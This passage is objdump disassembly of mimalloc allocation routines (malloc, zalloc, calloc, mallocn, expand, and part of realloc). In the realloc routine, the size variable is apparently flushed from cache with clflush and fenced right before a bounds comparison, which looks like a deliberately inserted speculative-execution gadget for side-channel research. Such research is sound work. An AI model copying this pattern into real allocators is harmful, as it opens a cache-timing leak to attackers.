  402219:	48 8b 08             	mov    (%rax),%rcx
  40221c:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  402221:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  402225:	c3                   	retq   
  402226:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40222d:	00 00 00 
  402230:	31 c9                	xor    %ecx,%ecx
  402232:	31 d2                	xor    %edx,%edx
  402234:	e9 37 cf 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402239:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000402240 <mi_malloc_small>:
  402240:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402247:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  40224b:	48 8d 47 07          	lea    0x7(%rdi),%rax
  40224f:	48 c1 e8 03          	shr    $0x3,%rax
  402253:	49 8b 94 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rdx
  40225a:	00 
  40225b:	48 8b 42 10          	mov    0x10(%rdx),%rax
  40225f:	48 85 c0             	test   %rax,%rax
  402262:	74 14                	je     402278 <mi_malloc_small+0x38>
  402264:	48 8b 08             	mov    (%rax),%rcx
  402267:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  40226c:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  402270:	c3                   	retq   
  402271:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402278:	48 89 fe             	mov    %rdi,%rsi
  40227b:	31 c9                	xor    %ecx,%ecx
  40227d:	31 d2                	xor    %edx,%edx
  40227f:	4c 89 c7             	mov    %r8,%rdi
  402282:	e9 e9 ce 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402287:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40228e:	00 00 

0000000000402290 <_mi_heap_malloc_zero_ex>:
  402290:	44 0f b6 c2          	movzbl %dl,%r8d
  402294:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  40229b:	77 33                	ja     4022d0 <_mi_heap_malloc_zero_ex+0x40>
  40229d:	48 8d 46 07          	lea    0x7(%rsi),%rax
  4022a1:	48 c1 e8 03          	shr    $0x3,%rax
  4022a5:	48 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rax
  4022ac:	00 
  4022ad:	48 8b 48 10          	mov    0x10(%rax),%rcx
  4022b1:	48 85 c9             	test   %rcx,%rcx
  4022b4:	74 1a                	je     4022d0 <_mi_heap_malloc_zero_ex+0x40>
  4022b6:	48 8b 31             	mov    (%rcx),%rsi
  4022b9:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4022be:	48 89 70 10          	mov    %rsi,0x10(%rax)
  4022c2:	84 d2                	test   %dl,%dl
  4022c4:	75 1a                	jne    4022e0 <_mi_heap_malloc_zero_ex+0x50>
  4022c6:	48 89 c8             	mov    %rcx,%rax
  4022c9:	c3                   	retq   
  4022ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4022d0:	44 89 c2             	mov    %r8d,%edx
  4022d3:	e9 98 ce 00 00       	jmpq   40f170 <_mi_malloc_generic>
  4022d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4022df:	00 
  4022e0:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  4022e4:	74 0a                	je     4022f0 <_mi_heap_malloc_zero_ex+0x60>
  4022e6:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  4022ed:	eb d7                	jmp    4022c6 <_mi_heap_malloc_zero_ex+0x36>
  4022ef:	90                   	nop
  4022f0:	48 83 ec 08          	sub    $0x8,%rsp
  4022f4:	48 8b 50 28          	mov    0x28(%rax),%rdx
  4022f8:	31 f6                	xor    %esi,%esi
  4022fa:	48 89 cf             	mov    %rcx,%rdi
  4022fd:	e8 5e eb ff ff       	callq  400e60 <memset@plt>
  402302:	48 83 c4 08          	add    $0x8,%rsp
  402306:	c3                   	retq   
  402307:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40230e:	00 00 

0000000000402310 <_mi_heap_malloc_zero>:
  402310:	44 0f b6 c2          	movzbl %dl,%r8d
  402314:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  40231b:	77 33                	ja     402350 <_mi_heap_malloc_zero+0x40>
  40231d:	48 8d 46 07          	lea    0x7(%rsi),%rax
  402321:	48 c1 e8 03          	shr    $0x3,%rax
  402325:	48 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rax
  40232c:	00 
  40232d:	48 8b 48 10          	mov    0x10(%rax),%rcx
  402331:	48 85 c9             	test   %rcx,%rcx
  402334:	74 1c                	je     402352 <_mi_heap_malloc_zero+0x42>
  402336:	48 8b 31             	mov    (%rcx),%rsi
  402339:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  40233e:	48 89 70 10          	mov    %rsi,0x10(%rax)
  402342:	84 d2                	test   %dl,%dl
  402344:	75 1a                	jne    402360 <_mi_heap_malloc_zero+0x50>
  402346:	48 89 c8             	mov    %rcx,%rax
  402349:	c3                   	retq   
  40234a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402350:	31 c9                	xor    %ecx,%ecx
  402352:	44 89 c2             	mov    %r8d,%edx
  402355:	e9 16 ce 00 00       	jmpq   40f170 <_mi_malloc_generic>
  40235a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402360:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  402364:	74 0a                	je     402370 <_mi_heap_malloc_zero+0x60>
  402366:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  40236d:	eb d7                	jmp    402346 <_mi_heap_malloc_zero+0x36>
  40236f:	90                   	nop
  402370:	48 83 ec 08          	sub    $0x8,%rsp
  402374:	48 8b 50 28          	mov    0x28(%rax),%rdx
  402378:	31 f6                	xor    %esi,%esi
  40237a:	48 89 cf             	mov    %rcx,%rdi
  40237d:	e8 de ea ff ff       	callq  400e60 <memset@plt>
  402382:	48 83 c4 08          	add    $0x8,%rsp
  402386:	c3                   	retq   
  402387:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40238e:	00 00 

0000000000402390 <mi_heap_malloc>:
  402390:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  402397:	77 27                	ja     4023c0 <mi_heap_malloc+0x30>
  402399:	48 8d 46 07          	lea    0x7(%rsi),%rax
  40239d:	48 c1 e8 03          	shr    $0x3,%rax
  4023a1:	48 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rdx
  4023a8:	00 
  4023a9:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4023ad:	48 85 c0             	test   %rax,%rax
  4023b0:	74 0e                	je     4023c0 <mi_heap_malloc+0x30>
  4023b2:	48 8b 08             	mov    (%rax),%rcx
  4023b5:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  4023ba:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  4023be:	c3                   	retq   
  4023bf:	90                   	nop
  4023c0:	31 c9                	xor    %ecx,%ecx
  4023c2:	31 d2                	xor    %edx,%edx
  4023c4:	e9 a7 cd 00 00       	jmpq   40f170 <_mi_malloc_generic>
  4023c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004023d0 <mi_malloc>:
  4023d0:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4023d7:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  4023db:	48 81 ff 00 04 00 00 	cmp    $0x400,%rdi
  4023e2:	77 2c                	ja     402410 <mi_malloc+0x40>
  4023e4:	48 8d 47 07          	lea    0x7(%rdi),%rax
  4023e8:	48 c1 e8 03          	shr    $0x3,%rax
  4023ec:	49 8b 94 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rdx
  4023f3:	00 
  4023f4:	48 8b 42 10          	mov    0x10(%rdx),%rax
  4023f8:	48 85 c0             	test   %rax,%rax
  4023fb:	74 13                	je     402410 <mi_malloc+0x40>
  4023fd:	48 8b 08             	mov    (%rax),%rcx
  402400:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  402405:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  402409:	c3                   	retq   
  40240a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402410:	48 89 fe             	mov    %rdi,%rsi
  402413:	31 c9                	xor    %ecx,%ecx
  402415:	31 d2                	xor    %edx,%edx
  402417:	4c 89 c7             	mov    %r8,%rdi
  40241a:	e9 51 cd 00 00       	jmpq   40f170 <_mi_malloc_generic>
  40241f:	90                   	nop

0000000000402420 <mi_zalloc_small>:
  402420:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402427:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  40242b:	48 8d 47 07          	lea    0x7(%rdi),%rax
  40242f:	48 c1 e8 03          	shr    $0x3,%rax
  402433:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  40243a:	00 
  40243b:	48 8b 48 10          	mov    0x10(%rax),%rcx
  40243f:	48 85 c9             	test   %rcx,%rcx
  402442:	74 24                	je     402468 <mi_zalloc_small+0x48>
  402444:	48 8b 11             	mov    (%rcx),%rdx
  402447:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  40244c:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402450:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  402454:	74 2a                	je     402480 <mi_zalloc_small+0x60>
  402456:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  40245d:	48 89 c8             	mov    %rcx,%rax
  402460:	c3                   	retq   
  402461:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402468:	48 89 fe             	mov    %rdi,%rsi
  40246b:	ba 01 00 00 00       	mov    $0x1,%edx
  402470:	4c 89 c7             	mov    %r8,%rdi
  402473:	e9 f8 cc 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402478:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40247f:	00 
  402480:	48 83 ec 08          	sub    $0x8,%rsp
  402484:	48 8b 50 28          	mov    0x28(%rax),%rdx
  402488:	31 f6                	xor    %esi,%esi
  40248a:	48 89 cf             	mov    %rcx,%rdi
  40248d:	e8 ce e9 ff ff       	callq  400e60 <memset@plt>
  402492:	48 83 c4 08          	add    $0x8,%rsp
  402496:	c3                   	retq   
  402497:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40249e:	00 00 

00000000004024a0 <mi_heap_zalloc>:
  4024a0:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  4024a7:	77 37                	ja     4024e0 <mi_heap_zalloc+0x40>
  4024a9:	48 8d 46 07          	lea    0x7(%rsi),%rax
  4024ad:	48 c1 e8 03          	shr    $0x3,%rax
  4024b1:	48 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rax
  4024b8:	00 
  4024b9:	48 8b 48 10          	mov    0x10(%rax),%rcx
  4024bd:	48 85 c9             	test   %rcx,%rcx
  4024c0:	74 20                	je     4024e2 <mi_heap_zalloc+0x42>
  4024c2:	48 8b 11             	mov    (%rcx),%rdx
  4024c5:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4024ca:	48 89 50 10          	mov    %rdx,0x10(%rax)
  4024ce:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  4024d2:	74 1c                	je     4024f0 <mi_heap_zalloc+0x50>
  4024d4:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  4024db:	48 89 c8             	mov    %rcx,%rax
  4024de:	c3                   	retq   
  4024df:	90                   	nop
  4024e0:	31 c9                	xor    %ecx,%ecx
  4024e2:	ba 01 00 00 00       	mov    $0x1,%edx
  4024e7:	e9 84 cc 00 00       	jmpq   40f170 <_mi_malloc_generic>
  4024ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4024f0:	48 83 ec 08          	sub    $0x8,%rsp
  4024f4:	48 8b 50 28          	mov    0x28(%rax),%rdx
  4024f8:	31 f6                	xor    %esi,%esi
  4024fa:	48 89 cf             	mov    %rcx,%rdi
  4024fd:	e8 5e e9 ff ff       	callq  400e60 <memset@plt>
  402502:	48 83 c4 08          	add    $0x8,%rsp
  402506:	c3                   	retq   
  402507:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40250e:	00 00 

0000000000402510 <mi_zalloc>:
  402510:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402517:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  40251b:	48 81 ff 00 04 00 00 	cmp    $0x400,%rdi
  402522:	77 3c                	ja     402560 <mi_zalloc+0x50>
  402524:	48 8d 47 07          	lea    0x7(%rdi),%rax
  402528:	48 c1 e8 03          	shr    $0x3,%rax
  40252c:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402533:	00 
  402534:	48 8b 48 10          	mov    0x10(%rax),%rcx
  402538:	48 85 c9             	test   %rcx,%rcx
  40253b:	74 25                	je     402562 <mi_zalloc+0x52>
  40253d:	48 8b 11             	mov    (%rcx),%rdx
  402540:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402545:	48 89 50 10          	mov    %rdx,0x10(%rax)
  402549:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  40254d:	74 29                	je     402578 <mi_zalloc+0x68>
  40254f:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  402556:	48 89 c8             	mov    %rcx,%rax
  402559:	c3                   	retq   
  40255a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402560:	31 c9                	xor    %ecx,%ecx
  402562:	48 89 fe             	mov    %rdi,%rsi
  402565:	ba 01 00 00 00       	mov    $0x1,%edx
  40256a:	4c 89 c7             	mov    %r8,%rdi
  40256d:	e9 fe cb 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402572:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402578:	48 83 ec 08          	sub    $0x8,%rsp
  40257c:	48 8b 50 28          	mov    0x28(%rax),%rdx
  402580:	31 f6                	xor    %esi,%esi
  402582:	48 89 cf             	mov    %rcx,%rdi
  402585:	e8 d6 e8 ff ff       	callq  400e60 <memset@plt>
  40258a:	48 83 c4 08          	add    $0x8,%rsp
  40258e:	c3                   	retq   
  40258f:	90                   	nop

0000000000402590 <mi_heap_calloc>:
  402590:	49 89 d0             	mov    %rdx,%r8
  402593:	48 83 fe 01          	cmp    $0x1,%rsi
  402597:	74 0b                	je     4025a4 <mi_heap_calloc+0x14>
  402599:	48 89 f0             	mov    %rsi,%rax
  40259c:	49 f7 e0             	mul    %r8
  40259f:	49 89 c0             	mov    %rax,%r8
  4025a2:	70 5c                	jo     402600 <mi_heap_calloc+0x70>
  4025a4:	49 81 f8 00 04 00 00 	cmp    $0x400,%r8
  4025ab:	77 3b                	ja     4025e8 <mi_heap_calloc+0x58>
  4025ad:	49 8d 40 07          	lea    0x7(%r8),%rax
  4025b1:	48 c1 e8 03          	shr    $0x3,%rax
  4025b5:	48 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rax
  4025bc:	00 
  4025bd:	48 8b 48 10          	mov    0x10(%rax),%rcx
  4025c1:	48 85 c9             	test   %rcx,%rcx
  4025c4:	74 24                	je     4025ea <mi_heap_calloc+0x5a>
  4025c6:	48 8b 11             	mov    (%rcx),%rdx
  4025c9:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4025ce:	48 89 50 10          	mov    %rdx,0x10(%rax)
  4025d2:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  4025d6:	74 38                	je     402610 <mi_heap_calloc+0x80>
  4025d8:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  4025df:	eb 21                	jmp    402602 <mi_heap_calloc+0x72>
  4025e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4025e8:	31 c9                	xor    %ecx,%ecx
  4025ea:	ba 01 00 00 00       	mov    $0x1,%edx
  4025ef:	4c 89 c6             	mov    %r8,%rsi
  4025f2:	e9 79 cb 00 00       	jmpq   40f170 <_mi_malloc_generic>
  4025f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4025fe:	00 00 
  402600:	31 c9                	xor    %ecx,%ecx
  402602:	48 89 c8             	mov    %rcx,%rax
  402605:	c3                   	retq   
  402606:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40260d:	00 00 00 
  402610:	48 83 ec 08          	sub    $0x8,%rsp
  402614:	48 8b 50 28          	mov    0x28(%rax),%rdx
  402618:	31 f6                	xor    %esi,%esi
  40261a:	48 89 cf             	mov    %rcx,%rdi
  40261d:	e8 3e e8 ff ff       	callq  400e60 <memset@plt>
  402622:	48 83 c4 08          	add    $0x8,%rsp
  402626:	c3                   	retq   
  402627:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40262e:	00 00 

0000000000402630 <mi_calloc>:
  402630:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402637:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  40263b:	48 83 ff 01          	cmp    $0x1,%rdi
  40263f:	74 0b                	je     40264c <mi_calloc+0x1c>
  402641:	48 89 f8             	mov    %rdi,%rax
  402644:	48 f7 e6             	mul    %rsi
  402647:	48 89 c6             	mov    %rax,%rsi
  40264a:	70 54                	jo     4026a0 <mi_calloc+0x70>
  40264c:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  402653:	77 3b                	ja     402690 <mi_calloc+0x60>
  402655:	48 8d 46 07          	lea    0x7(%rsi),%rax
  402659:	48 c1 e8 03          	shr    $0x3,%rax
  40265d:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  402664:	00 
  402665:	48 8b 48 10          	mov    0x10(%rax),%rcx
  402669:	48 85 c9             	test   %rcx,%rcx
  40266c:	74 24                	je     402692 <mi_calloc+0x62>
  40266e:	48 8b 11             	mov    (%rcx),%rdx
  402671:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  402676:	48 89 50 10          	mov    %rdx,0x10(%rax)
  40267a:	f6 40 0f 01          	testb  $0x1,0xf(%rax)
  40267e:	74 30                	je     4026b0 <mi_calloc+0x80>
  402680:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
  402687:	eb 19                	jmp    4026a2 <mi_calloc+0x72>
  402689:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402690:	31 c9                	xor    %ecx,%ecx
  402692:	ba 01 00 00 00       	mov    $0x1,%edx
  402697:	4c 89 c7             	mov    %r8,%rdi
  40269a:	e9 d1 ca 00 00       	jmpq   40f170 <_mi_malloc_generic>
  40269f:	90                   	nop
  4026a0:	31 c9                	xor    %ecx,%ecx
  4026a2:	48 89 c8             	mov    %rcx,%rax
  4026a5:	c3                   	retq   
  4026a6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4026ad:	00 00 00 
  4026b0:	48 83 ec 08          	sub    $0x8,%rsp
  4026b4:	48 8b 50 28          	mov    0x28(%rax),%rdx
  4026b8:	31 f6                	xor    %esi,%esi
  4026ba:	48 89 cf             	mov    %rcx,%rdi
  4026bd:	e8 9e e7 ff ff       	callq  400e60 <memset@plt>
  4026c2:	48 83 c4 08          	add    $0x8,%rsp
  4026c6:	c3                   	retq   
  4026c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4026ce:	00 00 

00000000004026d0 <mi_heap_mallocn>:
  4026d0:	49 89 d0             	mov    %rdx,%r8
  4026d3:	48 83 fe 01          	cmp    $0x1,%rsi
  4026d7:	74 0b                	je     4026e4 <mi_heap_mallocn+0x14>
  4026d9:	48 89 f0             	mov    %rsi,%rax
  4026dc:	49 f7 e0             	mul    %r8
  4026df:	49 89 c0             	mov    %rax,%r8
  4026e2:	70 44                	jo     402728 <mi_heap_mallocn+0x58>
  4026e4:	49 81 f8 00 04 00 00 	cmp    $0x400,%r8
  4026eb:	77 2b                	ja     402718 <mi_heap_mallocn+0x48>
  4026ed:	49 8d 40 07          	lea    0x7(%r8),%rax
  4026f1:	48 c1 e8 03          	shr    $0x3,%rax
  4026f5:	48 8b 94 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rdx
  4026fc:	00 
  4026fd:	48 8b 42 10          	mov    0x10(%rdx),%rax
  402701:	48 85 c0             	test   %rax,%rax
  402704:	74 12                	je     402718 <mi_heap_mallocn+0x48>
  402706:	48 8b 08             	mov    (%rax),%rcx
  402709:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  40270e:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  402712:	c3                   	retq   
  402713:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402718:	31 c9                	xor    %ecx,%ecx
  40271a:	31 d2                	xor    %edx,%edx
  40271c:	4c 89 c6             	mov    %r8,%rsi
  40271f:	e9 4c ca 00 00       	jmpq   40f170 <_mi_malloc_generic>
  402724:	0f 1f 40 00          	nopl   0x0(%rax)
  402728:	31 c0                	xor    %eax,%eax
  40272a:	c3                   	retq   
  40272b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000402730 <mi_mallocn>:
  402730:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  402737:	64 4c 8b 00          	mov    %fs:(%rax),%r8
  40273b:	48 83 ff 01          	cmp    $0x1,%rdi
  40273f:	74 0b                	je     40274c <mi_mallocn+0x1c>
  402741:	48 89 f8             	mov    %rdi,%rax
  402744:	48 f7 e6             	mul    %rsi
  402747:	48 89 c6             	mov    %rax,%rsi
  40274a:	70 44                	jo     402790 <mi_mallocn+0x60>
  40274c:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  402753:	77 2b                	ja     402780 <mi_mallocn+0x50>
  402755:	48 8d 46 07          	lea    0x7(%rsi),%rax
  402759:	48 c1 e8 03          	shr    $0x3,%rax
  40275d:	49 8b 94 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rdx
  402764:	00 
  402765:	48 8b 42 10          	mov    0x10(%rdx),%rax
  402769:	48 85 c0             	test   %rax,%rax
  40276c:	74 12                	je     402780 <mi_mallocn+0x50>
  40276e:	48 8b 08             	mov    (%rax),%rcx
  402771:	66 83 42 20 01       	addw   $0x1,0x20(%rdx)
  402776:	48 89 4a 10          	mov    %rcx,0x10(%rdx)
  40277a:	c3                   	retq   
  40277b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402780:	31 c9                	xor    %ecx,%ecx
  402782:	31 d2                	xor    %edx,%edx
  402784:	4c 89 c7             	mov    %r8,%rdi
  402787:	e9 e4 c9 00 00       	jmpq   40f170 <_mi_malloc_generic>
  40278c:	0f 1f 40 00          	nopl   0x0(%rax)
  402790:	31 c0                	xor    %eax,%eax
  402792:	c3                   	retq   
  402793:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40279a:	00 00 00 00 
  40279e:	66 90                	xchg   %ax,%ax

00000000004027a0 <mi_expand>:
  4027a0:	48 85 ff             	test   %rdi,%rdi
  4027a3:	74 5b                	je     402800 <mi_expand+0x60>
  4027a5:	48 8d 57 ff          	lea    -0x1(%rdi),%rdx
  4027a9:	49 89 f1             	mov    %rsi,%r9
  4027ac:	49 89 f8             	mov    %rdi,%r8
  4027af:	31 c0                	xor    %eax,%eax
  4027b1:	48 81 e2 00 00 00 fe 	and    $0xfffffffffe000000,%rdx
  4027b8:	7e 30                	jle    4027ea <mi_expand+0x4a>
  4027ba:	48 89 f8             	mov    %rdi,%rax
  4027bd:	48 29 d0             	sub    %rdx,%rax
  4027c0:	48 c1 e8 10          	shr    $0x10,%rax
  4027c4:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  4027c8:	48 c1 e0 05          	shl    $0x5,%rax
  4027cc:	48 8d b8 20 01 00 00 	lea    0x120(%rax),%rdi
  4027d3:	8b 84 02 24 01 00 00 	mov    0x124(%rdx,%rax,1),%eax
  4027da:	48 29 c7             	sub    %rax,%rdi
  4027dd:	48 01 d7             	add    %rdx,%rdi
  4027e0:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  4027e4:	75 22                	jne    402808 <mi_expand+0x68>
  4027e6:	48 8b 47 28          	mov    0x28(%rdi),%rax
  4027ea:	49 39 c1             	cmp    %rax,%r9
  4027ed:	b8 00 00 00 00       	mov    $0x0,%eax
  4027f2:	49 0f 46 c0          	cmovbe %r8,%rax
  4027f6:	c3                   	retq   
  4027f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4027fe:	00 00 
  402800:	31 c0                	xor    %eax,%eax
  402802:	c3                   	retq   
  402803:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402808:	4c 89 c6             	mov    %r8,%rsi
  40280b:	e8 e0 f2 ff ff       	callq  401af0 <mi_page_usable_aligned_size_of>
  402810:	eb d8                	jmp    4027ea <mi_expand+0x4a>
  402812:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  402819:	00 00 00 00 
  40281d:	0f 1f 00             	nopl   (%rax)

0000000000402820 <_mi_heap_realloc_zero>:
  402820:	49 89 f8             	mov    %rdi,%r8
  402823:	48 8d 7e ff          	lea    -0x1(%rsi),%rdi
  402827:	41 56                	push   %r14
  402829:	41 89 ce             	mov    %ecx,%r14d
  40282c:	41 55                	push   %r13
  40282e:	41 54                	push   %r12
  402830:	49 89 f4             	mov    %rsi,%r12
  402833:	55                   	push   %rbp
  402834:	31 ed                	xor    %ebp,%ebp
  402836:	53                   	push   %rbx
  402837:	48 89 d3             	mov    %rdx,%rbx
  40283a:	48 81 e7 00 00 00 fe 	and    $0xfffffffffe000000,%rdi
  402841:	7e 34                	jle    402877 <_mi_heap_realloc_zero+0x57>
  402843:	48 89 f0             	mov    %rsi,%rax
  402846:	48 29 f8             	sub    %rdi,%rax
  402849:	48 c1 e8 10          	shr    $0x10,%rax
  40284d:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
  402851:	48 c1 e0 05          	shl    $0x5,%rax
  402855:	48 8d 90 20 01 00 00 	lea    0x120(%rax),%rdx
  40285c:	8b 84 07 24 01 00 00 	mov    0x124(%rdi,%rax,1),%eax
  402863:	48 29 c2             	sub    %rax,%rdx
  402866:	48 01 d7             	add    %rdx,%rdi
  402869:	f6 47 0e 02          	testb  $0x2,0xe(%rdi)
  40286d:	0f 85 15 01 00 00    	jne    402988 <_mi_heap_realloc_zero+0x168>
  402873:	48 8b 6f 28          	mov    0x28(%rdi),%rbp
  402877:	48 89 2d 0a 5f 22 00 	mov    %rbp,0x225f0a(%rip)        # 628788 <size_realloc>
  40287e:	0f ae 3d 03 5f 22 00 	clflush 0x225f03(%rip)        # 628788 <size_realloc>
  402885:	0f ae f0             	mfence 
  402888:	0f ae e8             	lfence 
  40288b:	48 8b 05 f6 5e 22 00 	mov    0x225ef6(%rip),%rax        # 628788 <size_realloc>
  402892:	48 39 d8             	cmp    %rbx,%rax
  402895:	0f 83 cd 00 00 00    	jae    402968 <_mi_heap_realloc_zero+0x148>
  40289b:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
  4028a2:	0f 87 a0 00 00 00    	ja     402948 <_mi_heap_realloc_zero+0x128>
  4028a8:	48 8d 43 07          	lea    0x7(%rbx),%rax
  4028ac:	48 c1 e8 03          	shr    $0x3,%rax
  4028b0:	49 8b 84 c0 f8 00 00 	mov    0xf8(%r8,%rax,8),%rax
  4028b7:	00 
  4028b8:	4c 8b 68 10          	mov    0x10(%rax),%r13
  4028bc:	4d 85 ed             	test   %r13,%r13
  4028bf:	0f 84 83 00 00 00    	je     402948 <_mi_heap_realloc_zero+0x128>
  4028c5:	49 8b 55 00          	mov    0x0(%r13),%rdx
  4028c9:	66 83 40 20 01       	addw   $0x1,0x20(%rax)
  4028ce:	48 89 50 10          	mov    %rdx,0x10(%rax)
  4028d2:	48 39 eb             	cmp    %rbp,%rbx
  4028d5:	76 05                	jbe    4028dc <_mi_heap_realloc_zero+0xbc>
  4028d7:	45 84 f6             	test   %r14b,%r14b
  4028da:	75 44                	jne    402920 <_mi_heap_realloc_zero+0x100>
  4028dc:	48 85 db             	test   %rbx,%rbx
  4028df:	74 2f                	je     402910 <_mi_heap_realloc_zero+0xf0>
  4028e1:	4d 85 e4             	test   %r12,%r12
  4028e4:	74 1d                	je     402903 <_mi_heap_realloc_zero+0xe3>
  4028e6:	48 39 eb             	cmp    %rbp,%rbx
  4028e9:	48 89 ea             	mov    %rbp,%rdx
  4028ec:	4c 89 ef             	mov    %r13,%rdi
  4028ef:	4c 89 e6             	mov    %r12,%rsi
  4028f2:	48 0f 46 d3          	cmovbe %rbx,%rdx
  4028f6:	e8 a5 e5 ff ff       	callq  400ea0 <memcpy@plt>
  4028fb:	4c 89 e7             	mov    %r12,%rdi
  4028fe:	e8 5d f3 ff ff       	callq  401c60 <mi_free>
  402903:	5b                   	pop    %rbx
  402904:	4c 89 e8             	mov    %r13,%rax
  402907:	5d                   	pop    %rbp
  402908:	41 5c                	pop    %r12
  40290a:	41 5d                	pop    %r13
  40290c:	41 5e                	pop    %r14
  40290e:	c3                   	retq   
  40290f:	90                   	nop
  402910:	41 c6 45 00 00       	movb   $0x0,0x0(%r13)
  402915:	eb ca                	jmp    4028e1 <_mi_heap_realloc_zero+0xc1>
